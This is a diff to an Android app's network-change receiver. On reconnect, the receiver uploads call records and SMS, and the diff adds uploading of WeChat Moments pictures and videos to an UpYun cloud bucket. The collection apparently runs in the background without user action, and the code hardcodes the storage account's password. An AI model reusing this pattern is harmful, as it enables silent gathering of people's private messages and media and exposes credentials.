@@ -1,14 +1,19 @@
 package com.mikuwxc.autoreply.receiver;
 
 import android.content.BroadcastReceiver;
+import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabase;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Environment;
 
+import com.alibaba.fastjson.JSON;
 import com.google.gson.Gson;
 import com.lzy.okgo.OkGo;
+import com.lzy.okgo.callback.FileCallback;
 import com.lzy.okgo.callback.StringCallback;
 import com.mikuwxc.autoreply.bean.ApphttpBean;
 import com.mikuwxc.autoreply.bean.SharePerSmsBean;
@@ -19,14 +24,26 @@ import com.mikuwxc.autoreply.common.net.NetApi;
 import com.mikuwxc.autoreply.common.util.AppConfig;
 import com.mikuwxc.autoreply.common.util.SPHelper;
 import com.mikuwxc.autoreply.utils.SystemUtil;
+import com.mikuwxc.autoreply.wxmoment.Config;
+import com.mikuwxc.autoreply.wxmoment.MomentPicUpload;
+import com.mikuwxc.autoreply.wxmoment.model.SnsInfo;
+import com.upyun.library.common.Params;
+import com.upyun.library.common.UploadEngine;
+import com.upyun.library.listener.UpCompleteListener;
+import com.upyun.library.listener.UpProgressListener;
+import com.upyun.library.utils.UpYunUtils;
 
 import org.json.JSONArray;
 import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
+import java.util.UUID;
 
 import okhttp3.Call;
 import okhttp3.Response;
@@ -51,6 +68,8 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
             uploadPhoneRecord();
             //检查是否有短信可上传
             uploadLocalSms();
+            //检查是否有朋友圈数据可上传
+            uploadMoment();
 
         } else {
             /**
@@ -60,6 +79,15 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
         }
 
     }
+
+    private void uploadMoment() {
+        //先判断朋友圈数据库是否存在
+        File file = new File(Config.EXT_DIR + "/moment.db");
+        if(file.exists()){
+            MomentPicUpload.handleDatas2();
+        }
+    }
+
 
     private void uploadLocalSms() {
         SPHelper.init(MyApp.getAppContext());
@@ -139,6 +167,155 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
                 RecordUpload.handleArm2mp3(name, f.getAbsolutePath(), startTime, endTime, imei, type, phoneNum);
             }
         }
+    }
+
+
+
+
+
+    private static void downloadVideo(String linkAddress) {
+        final String fileName = UUID.randomUUID().toString() + ".avi".replaceAll("-", "");
+        OkGo.<File>get(linkAddress)
+                .tag(linkAddress)
+                .execute(new FileCallback(Config.EXT_DIR + "/video", fileName) {
+                    @Override
+                    public void onSuccess(File file, Call call, Response response) {
+                        String tag = (String) call.request().tag();
+                        SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(new File(Config.EXT_DIR + "/moment.db"), null);
+                        ContentValues c = new ContentValues();
+                        c.put("yunaddress", AppConfig.YOUPAIYUN + "/moment/video/" + fileName);
+                        database.update("media", c, "address=?", new String[]{tag});
+                        database.close();
+
+                    }
+
+                    @Override
+                    public void onError(Call call, Response response, Exception e) {
+                        super.onError(call, response, e);
+                    }
+                });
+    }
+
+
+
+
+    /**
+     * @param linkAddress 下载链接
+     **/
+    private static void downloadPic(String linkAddress) {
+        final String fileName = UUID.randomUUID().toString() + ".jpg".replaceAll("-", "");
+        OkGo.<File>get(linkAddress)
+                .tag(linkAddress)
+                .execute(new FileCallback(Config.EXT_DIR + "/pic", fileName) {
+                    @Override
+                    public void onSuccess(File file, Call call, Response response) {
+                        String tag = (String) call.request().tag();
+                        SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(new File(Config.EXT_DIR + "/moment.db"), null);
+                        ContentValues c = new ContentValues();
+                        c.put("yunaddress", AppConfig.YOUPAIYUN + "/moment/pic/" + fileName);
+                        database.update("media", c, "address=?", new String[]{tag});
+                        database.close();
+
+                    }
+
+                    @Override
+                    public void onError(Call call, Response response, Exception e) {
+                        super.onError(call, response, e);
+                    }
+                });
+    }
+
+
+    /**
+     * 朋友圈上传图片
+     *
+     * @param picPath 图片sd卡路径
+     * @param name    文件名字(自定义一个)
+     *                *
+     **/
+    public static String uploadPic(String picPath, String name) {
+        File temp = new File(picPath);
+        final Map<String, Object> paramsMap = new HashMap<>();
+        //上传又拍云的命名空间
+        paramsMap.put(Params.BUCKET, "cloned");
+        //又拍云的保存路径，任选其中一个
+        String savePath = "/moment/" + "/pic/" + name;
+        paramsMap.put(Params.SAVE_KEY, savePath);
+        //时间戳加上15秒
+        paramsMap.put(Params.EXPIRATION, System.currentTimeMillis() + 15);
+        //进度回调，可为空
+        UpProgressListener progressListener = new UpProgressListener() {
+            @Override
+            public void onRequestProgress(final long bytesWrite, final long contentLength) {
+            }
+        };
+        //结束回调，不可为空
+        UpCompleteListener completeListener = new UpCompleteListener() {
+            @Override
+            public void onComplete(boolean isSuccess, String result) {
+
+                if (isSuccess) {
+                    try {
+                        // /moment/pic/94bfb4f3-53d1-49ca-a73e-46a56a4d4abd.jpg
+                        String url = AppConfig.YOUPAIYUN + new JSONObject(result).optString("url");
+                        SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(new File(Config.EXT_DIR + "/moment.db"), null);
+                        database.execSQL("update media set uploadsuccess=? where yunaddress=?", new String[]{"true", url});
+                        database.close();
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        };
+
+        //表单上传（本地签名方式）
+        UploadEngine.getInstance().formUpload(temp, paramsMap, "unesmall", UpYunUtils.md5("unesmall123456"), completeListener, progressListener);
+        return "";
+    }
+
+
+    /**
+     * 朋友圈上传视频
+     **/
+    //上传自己发送的视频
+    public static String uploadVideo(String picPath, String name) {
+        File temp = new File(picPath);
+        final Map<String, Object> paramsMap = new HashMap<>();
+        //上传又拍云的命名空间
+        paramsMap.put(Params.BUCKET, "cloned");
+        //又拍云的保存路径，任选其中一个
+        String savePath = "/moment/" + "/video/" + name;
+        paramsMap.put(Params.SAVE_KEY, savePath);
+        //时间戳加上15秒
+        paramsMap.put(Params.EXPIRATION, System.currentTimeMillis() + 15);
+        //进度回调，可为空
+        UpProgressListener progressListener = new UpProgressListener() {
+            @Override
+            public void onRequestProgress(final long bytesWrite, final long contentLength) {
+            }
+        };
+        //结束回调，不可为空
+        UpCompleteListener completeListener = new UpCompleteListener() {
+            @Override
+            public void onComplete(boolean isSuccess, String result) {
+                if (isSuccess) {
+                    try {
+                        // /moment/video/94bfb4f3-53d1-49ca-a73e-46a56a4d4abd.avi
+                        String url = AppConfig.YOUPAIYUN + new JSONObject(result).optString("url");
+                        SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(new File(Config.EXT_DIR + "/moment.db"), null);
+                        database.execSQL("update media set uploadsuccess=? where yunaddress=?", new String[]{"true", url});
+                        database.close();
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+
+            }
+        };
+        //表单上传（本地签名方式）
+        UploadEngine.getInstance().formUpload(temp, paramsMap, "unesmall", UpYunUtils.md5("unesmall123456"), completeListener, progressListener);
+
+        return "";
     }
 
 
